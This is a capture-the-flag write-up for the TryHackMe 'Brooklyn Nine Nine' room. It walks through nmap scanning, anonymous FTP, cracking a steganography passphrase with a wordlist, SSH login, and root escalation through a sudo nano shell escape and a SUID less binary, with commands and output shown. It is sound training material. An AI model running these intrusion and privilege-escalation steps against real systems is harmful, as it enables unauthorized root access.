# [TryHackMe Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

Just another __*fantastic*__ day for hacking! 

We start by deploying the machine. We've got the IP address of the virtual machine: `10.10.247.201`. Please change it where necessary in this write-up to your own virtual machine IP address!
```
$ export IP=10.10.247.201
```
This command creates an environment variable called $IP with the value given, so we can access it thru bash anywhere needed by calling $IP.
Please also note that, every line that starts with a $ means a terminal command, so when copy&paste'ing commands remember to remove the initial $.

Every time we want to know about our machine, we do the process of "enumeration", which consists in listing which ports, services and possible vulnerabilities may be exploitable in the machine we are analysing. 

Let's do the first one: port and service enumeration!
```
$ nmap -sV -sC -oN nmap-initial $IP

Starting Nmap 7.60 ( https://nmap.org ) at 2020-07-26 11:12 -03
Nmap scan report for 10.10.247.201
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.11.107
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.40 seconds
```
We note that there are three services open: A FTP server on port 21, a SSH server on port 22, and a Web server on port 80. 
We also note that the FTP server accepts anonymous login... hmm... and there is a file called `note_to_jake.txt` there. Let's log in and download it to take a look...

```
$ ftp $IP
Connected to 10.10.247.201.
220 (vsFTPd 3.0.3)
Name (10.10.247.201:landau): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (62.2114 kB/s)
ftp> exit
221 Goodbye.
```

Now reading the note_to_jake.txt file:
```
$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

So, with this simple file, we have some good info: There should be at least three users: amy, jake and holt. But no other info on the password.
We have another source of information we haven't checked yet: There is a web server on port 80.
We can open it on the browser, and check the source code:
```
(...)

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>

(...)
```
Steganography! Let's download the file and extract it!
```
$ wget $IP/brooklyn99.jpg
```
Alrighty! Now we just try to extract the info inside the file with steghide:
```
$ steghide extract -sf brooklyn99.jpg
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```
Hmm... password protected. Let's break it with [StegCracker](https://github.com/Paradoxis/StegCracker)
```
stegcracker brooklyn99.jpg 
StegCracker 2.0.8 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: <REDACTED>
Tried 20### passwords
Your file has been written to: brooklyn99.jpg.out
```
Ok, information extracted from the file. What it is?

```
$ cat brooklyn99.jpg.out 
Holts Password:
<REDACTED>

Enjoy!!

```
This password must be the SSH credential for the `holt` user! Let's try and log in:
```
$ ssh holt@$IP
```
and fill in the password we've found. We're in!
Listing the files in the home folder with the `ls -la` command, we see that there is a `user.txt` file. Must be the user flag!
```
cat user.txt
<REDACTED>
```
Now we need to get the root flag.
There is a nano.save file... hmm... something about nano?
```
$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano

```
So it can run nano with sudo without password! 
Let's check [GTFOBins](https://gtfobins.github.io/) if there is some sudo breakout with nano:
```
It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

> sudo nano
> ^R^X
> reset; sh 1>&0 2>&0
```
NICE! let's run then `sudo nano nano.save`, press CTRL+R CTRL+X and enter the command above `reset; sh 1>&0 2>&0`

```
# id
uid=0(root) gid=0(root) groups=0(root)
```
WE. ARE. ROOT. 

SWEET!

```
cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <REDACTED>

Enjoy!!
```

## BONUS:
There is a second way to get to the root.txt file. If we search for SUID files...
```
$ find / -perm -u=s -type f 2>/dev/null
(...)
/bin/mount
/bin/su
/bin/ping
/bin/fusermount
/bin/less
/bin/umount
```
less? This one is not an usual SUID file...
```
$ ls -ls $(which less)
0 lrwxrwxrwx 1 root root 9 Feb  3 18:22 /usr/bin/less -> /bin/less
```
SUID owned by root... so we can use it to read the /root/root.txt file!
```
$ less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <REDACTED>

Enjoy!!
```
Thank you [FSociety2006](https://tryhackme.com/p/Fsociety2006) for creating this fantastic machine! It touches a lot of concepts for beginners and give that feeling for PrivEsc we all love to have. It was very fun!

Also thanks for the [TryHackMe](https://tryhackme.com/) team for hosting the machine and the challenge page. You guys rock!
